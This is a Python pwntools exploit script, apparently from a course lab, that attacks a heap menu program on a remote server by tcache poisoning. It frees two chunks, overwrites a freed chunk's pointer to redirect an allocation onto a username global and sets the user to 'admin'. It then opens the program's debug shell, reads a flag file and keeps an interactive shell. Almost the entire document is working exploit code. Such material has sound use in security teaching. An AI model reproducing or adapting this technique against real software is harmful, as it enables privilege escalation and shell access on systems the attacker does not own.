''' Script Module Importing '''
from pwn import *

''' Constant Initialization '''
TARGET_ADR = 0x4040a0       # location of username string
TARGET_USR = b'admin'       # username to set
CHUNK_A = 'A'
CHUNK_B = 'B'
CAT_COMMAND = b'cat /home/lab8-2/flag.txt'

def allocate_chunk(p, chunk_name, content, first_allocation):
    print("    [-] Selecting Option (1) New")
    p.sendlineafter(b"Choice: ", b'1')                  # Select Option (1) New

    print(f"    [-] Sending Chunk '{chunk_name}' Contents: "
          f"{'Buffer Fill' if first_allocation or chunk_name != CHUNK_A else 'Overwrite Username'}")
    p.sendlineafter(b"Contents: ", content)             # Fill Chunk

    output = p.readuntil(b')')                          # Read until the closing parenthesis
    chunk_id = output.split(b'#')[1].split(b')')[0]     # Extract ID number

    if first_allocation:
        print(f"    [-] Chunk '{chunk_name}' Saved with ID#: {int(chunk_id)}\n")
    else:
        print(f"    [-] Chunk '{chunk_name}' Successfully Reallocated\n")
        if chunk_name == CHUNK_A:
            print(f"    [!] User Successfully Elevated to '{content.decode('utf-8')}'")

    return chunk_id


def free_chunk(p, chunk_name, chunk_id):
    print("    [-] Selecting Option (3) Delete")
    p.sendlineafter(b"Choice: ", b'3')                  # Select Option (3) Delete

    print(f"    [-] Freeing Chunk {chunk_name}\n")
    p.sendlineafter(b"ID?: ", chunk_id)                 # Free Chunk


def overwrite_pointer(p, chunk_name, chunk_id):
    print("    [-] Selecting Option (4) Edit")
    p.sendlineafter(b"Choice: ", b'4')                  # Select Option (4) Edit

    print(f"    [-] Selecting Chunk {chunk_name}")
    p.sendlineafter(b"ID?: ", chunk_id)                 # Select Chunk

    print(f"    [-] Overwriting Pointer in Chunk {chunk_name}\b")
    p.sendlineafter(b"contents: ", p64(TARGET_ADR))     # Overwrite Pointer

def print_flag(p):
    p.sendline(CAT_COMMAND)
    flag = p.recvline().decode()
    print(f"    [!] {flag}")


if __name__ == "__main__":
    ''' Establish Connection '''
    p = remote("csc748.hostbin.org", 7082)      # Test Script Against Server
    # p = process("./8-2_lab.bin")              # Test Script Locally
    # p = gdb.debug("./8-2_lab.bin")            # Debug with GDB

    ''' Execute Tcache Poisoning '''
    print("\n[*] Allocating Chunks")
    id_a = allocate_chunk(p, 'A', b'AAAAAAAA', True)
    id_b = allocate_chunk(p, 'B', b'BBBBBBBB', True)

    print("\n[*] Freeing Chunks")
    free_chunk(p, 'A', id_a)
    free_chunk(p, 'B', id_b)

    print("\n[*] Overwriting B Pointer")
    overwrite_pointer(p, 'B', id_b)

    print("\n[*] Reallocating Chunks")
    allocate_chunk(p, 'B', b'BBBBBBBB', False)
    allocate_chunk(p, 'A', TARGET_USR, False)

    ''' Access Debug Shell '''
    print("\n[*] Accessing Debug Shell")

    print("    [-] Selecting Option (5) Debug shell")
    p.sendlineafter(b"Choice: ", b'5')          # Select Option (5) Debug shell

    print("    [-] Access Granted")

    print("\n[*] Printing Flag")
    print_flag(p)

    ''' Maintain Persistance '''
    p.interactive()         # Start Interactive Session
